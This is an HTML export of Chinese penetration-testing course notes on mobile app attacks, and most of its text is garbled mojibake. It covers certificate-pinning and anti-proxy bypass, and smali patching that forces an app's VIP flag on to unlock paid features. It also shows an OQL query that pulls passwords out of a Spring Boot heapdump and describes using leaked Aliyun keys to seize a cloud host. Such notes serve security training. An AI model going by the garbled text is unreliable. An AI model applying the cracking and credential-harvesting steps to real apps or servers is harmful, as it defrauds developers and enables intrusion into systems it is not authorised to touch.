<h4 id="åä»£ç†ç»•è¿‡ï¼š"><a href="#åä»£ç†ç»•è¿‡ï¼š" class="headerlink" title="åä»£ç†ç»•è¿‡ï¼š"></a>åä»£ç†ç»•è¿‡ï¼š</h4><p><a href="https://zone.huoxian.cn/d/440-app">https://zone.huoxian.cn/d/440-app</a><br>1ã€è‡ªèº«çš„æŠ“åŒ…åº”ç”¨<br>2ã€Proxifierè½¬å‘ä½¿ç”¨<br>æ€è·¯ï¼š<br>1ã€å…ˆä½¿ç”¨æ¨¡æ‹Ÿå™¨ä¸­çš„ä»£ç†è½¯ä»¶æ£€æµ‹appæ˜¯å¦æœ‰é˜²ä»£ç†æœºåˆ¶ï¼Œè‹¥å­˜åœ¨åˆ™è€ƒè™‘åœ¨å®¿ä¸»æœºä¸Šé‡‡ç”¨proxifierè½¬å‘æ¨¡æ‹Ÿå™¨çš„æ•°æ®åŒ…åˆ°burpç»•è¿‡åä»£ç†çš„æ£€æµ‹æœºåˆ¶<br>2ã€è‹¥é€šè¿‡ä¸Šè¿°æ‰‹æ®µåappä»æ˜¾ç¤ºç½‘è·¯é”™è¯¯ï¼Œä½†æ˜¯burpä¸­æ˜¾ç¤ºä¸€ä¸¤ä¸ªæ•°æ®åŒ…ï¼Œåˆ™æ˜¯éªŒè¯äº†è¯ä¹¦ï¼Œè‹¥æƒ³è¦ç»•è¿‡è¯ä¹¦å¯é‡‡ç”¨ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ï¼Œå®‰è£…xposedæ¡†æ¶â€“å®‰è£…ç»•è¿‡ä»£ç†ã€ç»•è¿‡è¯ä¹¦åº”ç”¨â€“å¼€å¯proxifierä»£ç†è½¬å‘</p>
<h4 id="è¯ä¹¦æ ¡éªŒç»•è¿‡ï¼š"><a href="#è¯ä¹¦æ ¡éªŒç»•è¿‡ï¼š" class="headerlink" title="è¯ä¹¦æ ¡éªŒç»•è¿‡ï¼š"></a>è¯ä¹¦æ ¡éªŒç»•è¿‡ï¼š</h4><p>æƒ…å†µ1ï¼Œå®¢æˆ·ç«¯ä¸å­˜åœ¨è¯ä¹¦æ ¡éªŒï¼ŒæœåŠ¡å™¨ä¹Ÿä¸å­˜åœ¨è¯ä¹¦æ ¡éªŒï¼Œ<br>æƒ…å†µ2ï¼Œå®¢æˆ·ç«¯å­˜åœ¨æ ¡éªŒæœåŠ¡ç«¯è¯ä¹¦ï¼ŒæœåŠ¡å™¨ä¹Ÿä¸å­˜åœ¨è¯ä¹¦æ ¡éªŒï¼Œå•é¡¹æ ¡éªŒã€‚<br>æƒ…å†µ3ã€å®¢æˆ·ç«¯å­˜åœ¨è¯ä¹¦æ ¡éªŒï¼ŒæœåŠ¡å™¨ä¹Ÿå­˜åœ¨è¯ä¹¦æ ¡éªŒï¼ŒåŒå‘æ ¡éªŒã€‚<br>1ã€Frida&amp;rocaptureåº•å±‚<br>2ã€Xposed&amp;JustTrust&amp;HOOK<br>3ã€åç¼–è¯‘é€†å‘æå–è¯ä¹¦é‡ç¼–æ‰“åŒ…</p>
<p>æ¢æ¢APPæµ‹è¯•ï¼š1ã€å…ˆå°è¯•æ¨¡æ‹Ÿå™¨ä»£ç†è½¬å‘æ•°æ®åˆ°burpï¼ˆæ˜¾ç¤ºç½‘ç»œè¿æ¥å¼‚å¸¸ï¼‰<br>2ã€å°è¯•ä½¿ç”¨proxifierä»£ç†è½¬å‘æ¨¡æ‹Ÿå™¨çš„æ•°æ®åŒ…åˆ°burpï¼ˆæœ‰æ•°æ®åŒ…ä½†æ˜¯å› ä¸ºè½¬å‘é€Ÿåº¦é™åˆ¶ä»å­˜åœ¨é—®é¢˜ï¼‰<br>3ã€ä½¿ç”¨xposedå°è¯•ç»•è¿‡åä»£ç†å’Œè¯ä¹¦</p>
<p>å¤œç¥æ¨¡æ‹Ÿå™¨å’Œé€é¥æ¨¡æ‹Ÿå™¨<br>æœ‰äº›åº”ç”¨å­˜åœ¨åè™šæ‹ŸæœºåŠŸèƒ½ï¼Œæ£€æµ‹åˆ°ä¸ºè™šæ‹Ÿæœºæ—¶ä¼šæ‰“ä¸å¼€åº”ç”¨ï¼Œå¤œç¥æ¨¡æ‹Ÿå™¨å¯ä»¥ç»•è¿‡åvmæ£€æµ‹</p>
<h1 id="ç¬¬69å¤©-APPæ”»é˜²-åç¼–è¯‘-æŸ¥å£³è„±å£³-é‡æ‰“åŒ…ç­¾å-ä¿®æ”¹æ¬¡æ•°ä¼šå‘˜ç‰ˆæƒé™åˆ¶"><a href="#ç¬¬69å¤©-APPæ”»é˜²-åç¼–è¯‘-æŸ¥å£³è„±å£³-é‡æ‰“åŒ…ç­¾å-ä¿®æ”¹æ¬¡æ•°ä¼šå‘˜ç‰ˆæƒé™åˆ¶" class="headerlink" title="ç¬¬69å¤© APPæ”»é˜²-åç¼–è¯‘&amp;æŸ¥å£³è„±å£³&amp;é‡æ‰“åŒ…ç­¾å&amp;ä¿®æ”¹æ¬¡æ•°ä¼šå‘˜ç‰ˆæƒé™åˆ¶"></a>ç¬¬69å¤© APPæ”»é˜²-åç¼–è¯‘&amp;æŸ¥å£³è„±å£³&amp;é‡æ‰“åŒ…ç­¾å&amp;ä¿®æ”¹æ¬¡æ•°ä¼šå‘˜ç‰ˆæƒé™åˆ¶</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-46"><a href="#çŸ¥è¯†ç‚¹ï¼š-46" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€APPé˜²ä»£ç†ç»•è¿‡-åº”ç”¨&amp;è½¬å‘<br>2ã€APPè¯ä¹¦æ ¡éªŒç±»å‹-å•å‘&amp;åŒå‘<br>3ã€APPè¯ä¹¦æ ¡éªŒç»•è¿‡-Frida&amp;XPæ¡†æ¶ç­‰</p>
<h4 id="ç« èŠ‚ç‚¹ï¼š-2"><a href="#ç« èŠ‚ç‚¹ï¼š-2" class="headerlink" title="ç« èŠ‚ç‚¹ï¼š"></a>ç« èŠ‚ç‚¹ï¼š</h4><p>1ã€ä¿¡æ¯æ”¶é›†-åº”ç”¨&amp;èµ„äº§æå–&amp;æƒé™ç­‰<br>2ã€æ¼æ´å‘ç°-åç¼–è¯‘&amp;è„±å£³&amp;ä»£ç å®¡è®¡<br>3ã€å®‰å…¨è¯„ä¼°-ç»„ä»¶&amp;æ•æ„Ÿå¯†åŒ™&amp;æ¶æ„åˆ†æ</p>
<h4 id="æ ¸å¿ƒç‚¹ï¼š-2"><a href="#æ ¸å¿ƒç‚¹ï¼š-2" class="headerlink" title="æ ¸å¿ƒç‚¹ï¼š"></a>æ ¸å¿ƒç‚¹ï¼š</h4><p>0ã€å†…åœ¨ç‚¹-èµ„äº§æå–&amp;ç‰ˆæœ¬&amp;ä¿¡æ¯ç­‰<br>1ã€æŠ“åŒ…ç‚¹-åä»£ç†&amp;åè¯ä¹¦&amp;åè®®ç­‰<br>2ã€é€†å‘ç‚¹-åç¼–è¯‘&amp;è„±å£³&amp;é‡æ‰“åŒ…ç­‰<br>3ã€å®‰å…¨ç‚¹-èµ„äº§&amp;æ¥å£&amp;æ¼æ´&amp;å®¡è®¡ç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-40"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-40" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>åç¼–è¯‘åŠ å›º-è‡ªåŠ¨æŸ¥å£³è„±å£³<br>åŠŸèƒ½ä¿®æ”¹-åç¼–è¯‘&amp;æ¬¡æ•°&amp;ä¼šå‘˜<br>åŠŸèƒ½ä¿®æ”¹-åç¼–è¯‘&amp;å›¾æ ‡&amp;ä¿¡æ¯<br>æ‰“åŒ…ç¼–è¯‘è¯ä¹¦ç­¾å&amp;é‡æ‰“åŒ…ç­‰</p>
<p>åç¼–è¯‘åŠ å›º-è‡ªåŠ¨æŸ¥å£³è„±å£³<br><a href="https://github.com/CodingGay/BlackDex">https://github.com/CodingGay/BlackDex</a><br>æŸ¥å£³ï¼šApkScan-PWD<br>è„±å£³ï¼šBlackDex</p>
<h4 id="åŠŸèƒ½ä¿®æ”¹-åç¼–è¯‘-æ¬¡æ•°-ä¼šå‘˜"><a href="#åŠŸèƒ½ä¿®æ”¹-åç¼–è¯‘-æ¬¡æ•°-ä¼šå‘˜" class="headerlink" title="#åŠŸèƒ½ä¿®æ”¹-åç¼–è¯‘&amp;æ¬¡æ•°&amp;ä¼šå‘˜"></a>#åŠŸèƒ½ä¿®æ”¹-åç¼–è¯‘&amp;æ¬¡æ•°&amp;ä¼šå‘˜</h4><p>è´µå¦ƒAPPå®æˆ˜ï¼š<br>æ€è·¯ï¼šåŠŸèƒ½æ¯æ—¥è§‚çœ‹æ¬¡æ•°å¤„å°è¯•ä¿®æ”¹æ‰‹æœºå‹å·ã€IEMIå€¼å¯ç»•è¿‡æ¬¡æ•°é™åˆ¶<br>ä¿®æ”¹get_is_svipä¸º1ï¼Œä½¿å¾—ç”¨æˆ·é»˜è®¤ä¸ºsvip<br>-æ¬¡æ•°ï¼š<br>é€»è¾‘ï¼šä¿®æ”¹æ‰‹æœºå‹å·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.method public getRe_today_view_times(Ljava/lang/String;</span><br><span class="line">	.locals 1</span><br><span class="line">	.line 307</span><br><span class="line">	iget-object vo,po,Lcom/ufozfnxzqm/dvbphwfo/entity/Userlnfo;-</span><br><span class="line">re_today_view_times:Ljava/lang/String;</span><br></pre></td></tr></table></figure>

<p>ä¼šå‘˜ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.method public getls_vipï¼ˆï¼‰I</span><br><span class="line">	.locals 1</span><br><span class="line">	.line 347</span><br><span class="line">	.iget vo,p0,Lcom/ufozfnxzqm/dvbphwfo/entity/Userlnfo;-&gt;is vip:I</span><br><span class="line">	const/4 vo.0x</span><br><span class="line">	return vo</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>

<h4 id="åŠŸèƒ½ä¿®æ”¹-åç¼–è¯‘-å›¾æ ‡-ä¿¡æ¯"><a href="#åŠŸèƒ½ä¿®æ”¹-åç¼–è¯‘-å›¾æ ‡-ä¿¡æ¯" class="headerlink" title="åŠŸèƒ½ä¿®æ”¹-åç¼–è¯‘&amp;å›¾æ ‡&amp;ä¿¡æ¯"></a>åŠŸèƒ½ä¿®æ”¹-åç¼–è¯‘&amp;å›¾æ ‡&amp;ä¿¡æ¯</h4><p>ä½¿ç”¨å®‰å“ä¿®æ”¹å¤§å¸ˆä¿®æ”¹å›¾æ ‡å’Œä¿¡æ¯ï¼Œè¿˜å¯ä»¥ä¿®æ”¹appæƒé™è·å–æ”¶é›†é€šè®¯å½•ç­‰</p>
<h1 id="ç¬¬70å¤©-APPæ”»é˜²-å¾®ä¿¡å°ç¨‹åº-è§£åŒ…åç¼–è¯‘-æ•°æ®æŠ“åŒ…-APKä¿¡æ¯èµ„æºæå–"><a href="#ç¬¬70å¤©-APPæ”»é˜²-å¾®ä¿¡å°ç¨‹åº-è§£åŒ…åç¼–è¯‘-æ•°æ®æŠ“åŒ…-APKä¿¡æ¯èµ„æºæå–" class="headerlink" title="ç¬¬70å¤© APPæ”»é˜²-å¾®ä¿¡å°ç¨‹åº&amp;è§£åŒ…åç¼–è¯‘&amp;æ•°æ®æŠ“åŒ…&amp;APKä¿¡æ¯èµ„æºæå–"></a>ç¬¬70å¤© APPæ”»é˜²-å¾®ä¿¡å°ç¨‹åº&amp;è§£åŒ…åç¼–è¯‘&amp;æ•°æ®æŠ“åŒ…&amp;APKä¿¡æ¯èµ„æºæå–</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-47"><a href="#çŸ¥è¯†ç‚¹ï¼š-47" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€APKä¿¡æ¯èµ„æºæå–<br>2ã€å¾®ä¿¡å°ç¨‹åºè‡´æ®æŠ“åŒ…<br>3ã€åšä¿¡å°ç¨‹åºè§£åŒ…åç¼–è¯‘</p>
<p>1ã€ä¿¡æ¯æ”¶é›†åº”ç”¨8èµ„äº§æå–&amp;æƒé™ç­‰<br>2ã€æ¼æ¶¦å‘ç°-åç¼–æ³½&amp;è„±å£³&amp;ä»£ç å®¡è®¡<br>3ã€å®‰å…¨è¯„ä¼°ç»„ä»¶8æ•£å¯†åŒ™&amp;æ€æ„åˆ†æ</p>
<h4 id="æ ¸å¿ƒç‚¹ï¼š-3"><a href="#æ ¸å¿ƒç‚¹ï¼š-3" class="headerlink" title="æ ¸å¿ƒç‚¹ï¼š"></a>æ ¸å¿ƒç‚¹ï¼š</h4><p>1ã€å†…åœ¨ç‚¹èµ„äº§æå–&amp;ç‰ˆæœ¬&amp;ä¿¡æ¯ç­‰<br>2ã€æŠ“åŒ…ç‚¹-åä»£ç†8åè¯ä¹¦8åè®®ç­‰<br>3ã€é€†å‘ç‚¹-åç¼–è¯‘8è„±å£³8é‡æ‰“åŒ…ç­‰<br>4ã€å®‰å…¨ç‚¹èµ„äº§&amp;æ¥å£&amp;æ¼æ´&amp;å®¡è®¡ç­‰</p>
<h3 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-41"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-41" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h3><p>APP&amp;APK-ä¿¡æ¯èµ„æºæ–‡ä»¶æå–<br>å¾®ä¿¡å°ç¨‹åº-çœŸæœº&amp;æ¨¡æ‹Ÿå™¨æ•°æ®æŠ“åŒ…<br>å¾®ä¿¡å°ç¨‹åº-PC&amp;æ¨¡æ‹Ÿå™¨åˆ†åŒ…åç¼–è¯‘</p>
<h4 id="APP-APK-ä¿¡æ¯èµ„æºæ–‡ä»¶æå–"><a href="#APP-APK-ä¿¡æ¯èµ„æºæ–‡ä»¶æå–" class="headerlink" title="APP&amp;APK-ä¿¡æ¯èµ„æºæ–‡ä»¶æå–"></a>APP&amp;APK-ä¿¡æ¯èµ„æºæ–‡ä»¶æå–</h4><p>APK Messengerâ€“æ˜¯æœ¬ä¿¡æ„¿&amp;èµ„æºæ–‡ä»¶&amp;å¼€å¯æƒé™ç­‰</p>
<h4 id="å¾®ä¿¡å°ç¨‹åºçœŸæœº-æ¨¡æ‹Ÿå™¨æ•°æ®æŠ“åŒ…"><a href="#å¾®ä¿¡å°ç¨‹åºçœŸæœº-æ¨¡æ‹Ÿå™¨æ•°æ®æŠ“åŒ…" class="headerlink" title="å¾®ä¿¡å°ç¨‹åºçœŸæœº&amp;æ¨¡æ‹Ÿå™¨æ•°æ®æŠ“åŒ…"></a>å¾®ä¿¡å°ç¨‹åºçœŸæœº&amp;æ¨¡æ‹Ÿå™¨æ•°æ®æŠ“åŒ…</h4><p>å®‰å“ç³»ç»ŸæŠ“åŒ…ï¼ˆå¾®ä¿¡å°ç¨‹åºï¼‰ï¼š<br>1ã€å®‰å“ç³»ç»Ÿ7.0ä»¥ä¸‹ç‰ˆæœ¬ï¼Œä¸ç®¡å¾®ä¿¡ä»»æ„ç‰ˆæœ¬ï¼Œéƒ½ä¼šä¿¡ä»»ç³»ç»Ÿæä¾›çš„è¯ä¹¦<br>2ã€å®‰å“ç³»ç»Ÿ7.0ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¾®ä¿¡7.0ä»¥ä¸‹ç‰ˆæœ¬ï¼Œå¾®ä¿¡ä¼šä¿¡ä»»ç³»ç»Ÿæä¾›çš„è¯ä¹¦<br>3ã€å®‰å“ç³»ç»Ÿ7.0ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¾®ä¿¡7.0ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¾®ä¿¡åªä¿¡ä»»å®ƒè‡ªå·±é…ç½®çš„è¯ä¹¦åˆ—è¡¨<br>åŸºäºä¸Šè¿°æˆ‘ä»¬è§£å†³çš„æ–¹å¼å¦‚ä¸‹ï¼š<br>1ã€å°†è¯ä¹¦å®‰è£…åˆ°ç³»ç»Ÿè¯ä¹¦ä¸­(éœ€è¦r00t)<br>2ã€è‹¹æœæ‰‹æœºï¼ˆè‹¹æœæ‰‹æœºä¸å—æ­¤å½±å“ï¼‰<br>3ã€é‡‡ç”¨å®‰å“ç³»ç»Ÿä½äº7.0çš„æ¨ªæ‹Ÿå™¨<br>æ¼”ç¤ºï¼šé€é¥æ¨¡æ‹Ÿå™¨5.1å®‰å“ç³»ç»Ÿå¾®ä¿¡å°ç¨‹åºæŠ“åŒ…<br>æ€è·¯ï¼šæ¨¡æ‹Ÿå™¨ä»£ç†è½¬å‘åˆ°burp<br>æ¼”ç¤ºï¼šå¤œç¥æ¨¡æ‹Ÿå™¨å¤šå¼€5å®‰å“ç³»ç»Ÿå¾®ä¿¡å°ç¨‹åºæŠ“åŒ…<br>æ¼”ç¤ºï¼šçœŸæœºIPhone-OSç³»ç»Ÿå¾®ä¿¡å°ç¨‹åºæŠ“åŒ…<br>æ¡ä»¶ï¼šæŠ“åŒ…æœ¬æœºéœ€è¦å’ŒIphoneæ‰‹æœºå¤„äºåŒä¸€WIFIä¸‹<br>Iphoneié…ç½®wifçš„ä»£ç†ï¼Œä»£ç†è®¾ç½®åœ°å€å†™æœ¬åœ°æŠ“åŒ…çš„å·¥å…·åœ°å€å’Œç«¯å£</p>
<p>å®‰å…¨ç‚¹ï¼š<br>æ¸—é€è§’åº¦ï¼šæµ‹è¯•çš„appæä¾›æœåŠ¡çš„æœåŠ¡å™¨ï¼Œç½‘ç«™ï¼Œæ¥å£ç­‰ï¼Œä¸€æ—¦è¿™ä¸ªæœ‰å®‰å…¨é—®é¢˜ï¼Œè¢«ä¸æ³•<br>åˆ†å­åˆ©ç”¨ï¼Œç›¸å½“äºAPPæ­£å¸¸æœåŠ¡å°±ä¼šå—åˆ°ç›´æ¥çš„å½±å“ï¼<br>APK-ç™½ç›’-Javaä»£ç å®¡è®¡<br>APK-é»‘ç›’-èµ„äº§&amp;WEB&amp;IP&amp;æ¥å£ç­‰<br>å°ç¨‹åº-ç™½ç›’-Node.JSä»£ç å®¡è®¡<br>å°ç¨‹åºé»‘ç›’èµ„äº§&amp;WEB&amp;P&amp;æ¥å£ç­‰<br>å¼€å‘è§’åº¦ï¼šæµ‹è¯•çš„appé‡Œä»£ç çš„è®¾è®¡å®‰å…¨ï¼Œé‡‡ç”¨æ²¡åŠ å¯†çš„å‘é€æ•°æ®ï¼Œé‡‡ç”¨æƒé™è¿‡é«˜çš„è®¾ç½®<br>å¯¼è‡´æ”»å‡»è€…åˆ©ç”¨appè·å–åˆ°æ‰‹æœºçš„æ•æ„Ÿä¿¡æ¯ç­‰ã€‚<br>å¼±åŠ å¯†ï¼Œé€»è¾‘å®‰å…¨ï¼Œæˆæƒï¼Œä¸­é—´äººç­‰</p>
<h4 id="å¾®ä¿¡å°ç¨‹åº-PC-æ¨¡æ‹Ÿå™¨åˆ†åŒ…åç¼–è¯‘"><a href="#å¾®ä¿¡å°ç¨‹åº-PC-æ¨¡æ‹Ÿå™¨åˆ†åŒ…åç¼–è¯‘" class="headerlink" title="å¾®ä¿¡å°ç¨‹åº-PC&amp;æ¨¡æ‹Ÿå™¨åˆ†åŒ…åç¼–è¯‘"></a>å¾®ä¿¡å°ç¨‹åº-PC&amp;æ¨¡æ‹Ÿå™¨åˆ†åŒ…åç¼–è¯‘</h4><p>1ã€é«˜å¯Œå¸…ç‰ˆï¼š<br>æ¬¢è¿ä½¿ç”¨å¤šåŠŸèƒ½å°ç¨‹åºåŠ©æ‰‹å·¥å…·ï¼Œç‚¹å‡»ç¡®å®šå¼€å§‹ä½¿ç”¨ã€‚<br>å…è´£å£°æ˜ï¼šä¸å¾—å°†å°ç¨‹åºåç¼–æ³½æºç ç¨‹åºå’Œåç¼–æ³½å›¾ç‰‡ç´ ææŒªä½œå•†ä¸šæˆ–ç›ˆåˆ©ç”¨<br>ä½¿ç”¨æ•™ç¨‹åœ°ï¼šhttps:<a href="http://www.kancloud.cn/ludeqi/XCXZS/2607637">www.kancloud.cn/ludeqi/XCXZS/2607637</a><br>æœ€æ–°ç‰ˆä¸‹è½½åœ°å€ï¼šhttps:xcX.siqingw.top&#x2F;xcx.zip<br>2ã€ç©·å±Œä¸ç‰ˆï¼š<br><a href="https://github.com/sanriqing/WxAppUnpacker">https://github.com/sanriqing/WxAppUnpacker</a><br>å®‰è£…node.js<br><a href="http://nodejs.cn/download/">http://nodejs.cn/download/</a><br>å®‰è£…ä¾èµ–ï¼š<br>npm install<br>æ¨¡æ‹Ÿå™¨å–å‡ºwxapkgæ–‡ä»¶ï¼š<br>&#x2F;data&#x2F;data&#x2F;com.tencent.mm&#x2F;MicroMsg&#x2F;xxxxxx&#x2F;appbrand&#x2F;pkg<br>åç¼–è¯‘è§£åŒ…<br>node wuWxapkg.js -s&#x3D;â€¦&#x2F;xxxx.wxapkg</p>
<h1 id="ç¬¬71å¤©-APPæ”»é˜²-å®æˆ˜æ‹¿ä¸‹-Springbootæœªæˆæƒ-HeapDumpæå–-OSSåˆ©ç”¨"><a href="#ç¬¬71å¤©-APPæ”»é˜²-å®æˆ˜æ‹¿ä¸‹-Springbootæœªæˆæƒ-HeapDumpæå–-OSSåˆ©ç”¨" class="headerlink" title="ç¬¬71å¤© APPæ”»é˜²-å®æˆ˜æ‹¿ä¸‹&amp;Springbootæœªæˆæƒ&amp;HeapDumpæå–&amp;OSSåˆ©ç”¨"></a>ç¬¬71å¤© APPæ”»é˜²-å®æˆ˜æ‹¿ä¸‹&amp;Springbootæœªæˆæƒ&amp;HeapDumpæå–&amp;OSSåˆ©ç”¨</h1><h4 id="å®‰å…¨æµ‹è¯•æŠ¥å‘Šï¼š"><a href="#å®‰å…¨æµ‹è¯•æŠ¥å‘Šï¼š" class="headerlink" title="å®‰å…¨æµ‹è¯•æŠ¥å‘Šï¼š"></a>å®‰å…¨æµ‹è¯•æŠ¥å‘Šï¼š</h4><p>1ã€Spring Boot Actuator v.2æœªæˆæƒè®¿é—®<br>2ã€Spring Boot RCE<br>3ã€HeapDump-ä¿¡æ¯æ³„æ¼-å¸å·å¯†ç ç­‰<br>select s from java.lang.String s<br>where &#x2F;pass&#x2F;.test(s.value.toStringï¼ˆï¼‰)</p>
<p>-HeapDump:åˆ†æï¼š            â€”â€”â€”-å¿½ç„¶æƒ³èµ·æ¥ä¹‹å‰é‡åˆ°æ¸—é€é¶åœºé‡Œé¢ä¹Ÿè€ƒäº†è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œå°±æ˜¯åœ¨æ³„éœ²çš„ä¿¡æ¯ä¸­æ‰¾çš„åˆ°flagã€‚<br>JVisualVM MAT heapdump_toolç­‰<br>JVisualVM:jdkè‡ªå¸¦<br>MAT:<a href="https://www.eclipse.org/mat/downloads.php">https://www.eclipse.org/mat/downloads.php</a><br>heapdump_tool:<a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a><br>-Actuatoræœªæˆæƒæ£€æµ‹ï¼š<br><a href="https://github.com/rabbitmask/SB-Actuator">https://github.com/rabbitmask/SB-Actuator</a><br>-SpringBootiæ¼æ´åˆ©ç”¨ï¼š<br><a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a><br>-OSS_AccessKeyåˆ©ç”¨ï¼š<br><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a></p>
<h4 id="å½•åƒå‰ªè¾‘ä¸¥é‡è¿™é‡Œåªç®€å•è¯´ä¸€ä¸‹æ€è·¯ï¼š"><a href="#å½•åƒå‰ªè¾‘ä¸¥é‡è¿™é‡Œåªç®€å•è¯´ä¸€ä¸‹æ€è·¯ï¼š" class="headerlink" title="å½•åƒå‰ªè¾‘ä¸¥é‡è¿™é‡Œåªç®€å•è¯´ä¸€ä¸‹æ€è·¯ï¼š"></a>å½•åƒå‰ªè¾‘ä¸¥é‡è¿™é‡Œåªç®€å•è¯´ä¸€ä¸‹æ€è·¯ï¼š</h4><p>APPæŠ“åŒ…ä¿¡æ¯æ”¶é›†å‡ºåŸŸåå‘ç°ä½¿ç”¨webpackæ‰€ä»¥packfuzzè¿›è¡Œæ‰«æï¼Œ<br>å†æŠŠåŸŸåæ”¾åˆ°awvsè¿›è¡Œæ‰«æ<br>â€“å‘ç°actuatoræœªæˆæƒè®¿é—®æ¼æ´ï¼ˆè¿›è¡Œrceæµ‹è¯•ï¼‰<br>â€“ä¸‹è½½heapdumpä¸‹è½½ååˆ†æâ€“ç¿»å‡ºé˜¿é‡Œäº‘mysqlè´¦å·å¯†ç <br>â€“å› ä¸ºåªèƒ½æœ¬åœ°è®¿é—®æ‰€ä»¥è¿æ¥å¤±è´¥â€“ç»§ç»­ç¿»heapdumpæ–‡ä»¶ä½¿ç”¨heapdump_toolsç¿»å‡ºé˜¿é‡Œäº‘ä¸»æœºkey<br>â€“è·å–åˆ°é˜¿é‡Œäº‘ä¸»æœºæƒé™</p>
<h1 id="ç¬¬72å¤©-æ¼æ´å‘ç°-Webæ¡†æ¶ä¸­é—´ä»¶-è”åŠ¨-Goby-Afrog-Xray-Awvs-Vulmap"><a href="#ç¬¬72å¤©-æ¼æ´å‘ç°-Webæ¡†æ¶ä¸­é—´ä»¶-è”åŠ¨-Goby-Afrog-Xray-Awvs-Vulmap" class="headerlink" title="ç¬¬72å¤© æ¼æ´å‘ç°-Webæ¡†æ¶ä¸­é—´ä»¶&amp;è”åŠ¨&amp;Goby&amp;Afrog&amp;Xray&amp;Awvs&amp;Vulmap"></a>ç¬¬72å¤© æ¼æ´å‘ç°-Webæ¡†æ¶ä¸­é—´ä»¶&amp;è”åŠ¨&amp;Goby&amp;Afrog&amp;Xray&amp;Awvs&amp;Vulmap</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-48"><a href="#çŸ¥è¯†ç‚¹ï¼š-48" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€Bupç®€å•ä»‹ç»&amp;ä½¿ç”¨è¯´æ˜<br>2ã€Xrayç®€å•ä»‹ç»&amp;ä½¿ç”¨è¯´æ˜<br>3ã€AWWSç®€å•ä»‹ç»&amp;ä½¿ç”¨è¯´æ˜<br>4ã€Gobyç®€å•ä»‹ç»&amp;ä½¿ç”¨è¯´æ˜<br>5ã€Afrogç®€å•ä»‹ç»&amp;ä½¿ç”¨è¯´æ˜<br>6ã€ulmapç®€å•ä»‹ç»&amp;ä½¿ç”¨è¯´æ˜<br>7ã€Pocassistç®€å•ä»‹ç»&amp;ä½¿ç”¨è¯´æ˜<br>8ã€æŒæ¡å·¥å…·å®‰è£…ä½¿ç”¨&amp;åŸç†&amp;è”åŠ¨&amp;é€‚ç”¨<br>å¸‚é¢ä¸Šæœ‰å¾ˆå¤šæ¼æ‰«ç³»ç»Ÿå·¥å…·è„šæœ¬ï¼Œè¯¾ç¨‹è®²åˆ°çš„åŸºæœ¬éƒ½æ˜¯ç›®å‰ä¸»æµæ¨èçš„ä¼˜ç§€é¡¹ç›®ï¼<br>å…·ä½“é¡¹ç›®ï¼šBurpsuite,Awvs,Xray,Goby,Afrog,Vulmap,Pocassist,Nessus,<br>Nuclei,Pentestkit,Kunyu,BPæ’­ä»¶(HaE,ShiroScan.FastJsonScan,Log4j2Scanç­‰)ç­‰ã€‚</p>
<h4 id="ç« èŠ‚ç‚¹ï¼š-3"><a href="#ç« èŠ‚ç‚¹ï¼š-3" class="headerlink" title="ç« èŠ‚ç‚¹ï¼š"></a>ç« èŠ‚ç‚¹ï¼š</h4><p>1ã€æ¼æ´å‘ç°-Web&amp;æ¡†æ¶å±‚é¢<br>2ã€æ¼æ´å‘ç°-æœåŠ¡&amp;ä¸­é—´ä»¶å±‚é¢<br>2ã€æ¼æ´å‘ç°-APP&amp;å°ç¨‹åºå±‚é¢<br>3ã€æ¼æ´å‘ç°-PCæ“ä½œç³»ç»Ÿå±‚é¢</p>
<p>Acunetix-ä¸€æ¬¾å•†ä¸šçš„Webæ¼æ´æ‰«æç¨‹åºï¼Œå®ƒå¯ä»¥æ£€æŸ¥Webåº”ç”¨ç¨‹åºä¸­çš„æ¼æ´ï¼Œå¦‚SQLæ³¨ å…¥ã€è·¨ç«™è„šæœ¬æ”»å‡»ã€èº«ä»½éªŒè¯é¡µä¸Šçš„å¼±å£ä»¤é•¿åº¦ç­‰ã€‚å®ƒæ‹¥æœ‰ä¸€ä¸ªæ“ä½œæ–¹ä¾¿çš„å›¾å½¢ç”¨æˆ·ç•Œ é¢ï¼Œå¹¶ä¸”èƒ½å¤Ÿåˆ›å»ºä¸“ä¸šçº§çš„Wbç«™ç‚¹å®‰å…¨å®¡æ ¸æŠ¥å‘Šã€‚æ–°ç‰ˆæœ¬é›†æˆäº†æ¼æ´ç®¡ç†åŠŸèƒ½æ¥æ‰©å±•ä¼ ä¸šå…¨é¢ç®¡ç†ã€ä¼˜å…ˆçº§å’Œæ§åˆ¶æ¼æ´å¨èƒçš„èƒ½åŠ›ã€‚</p>
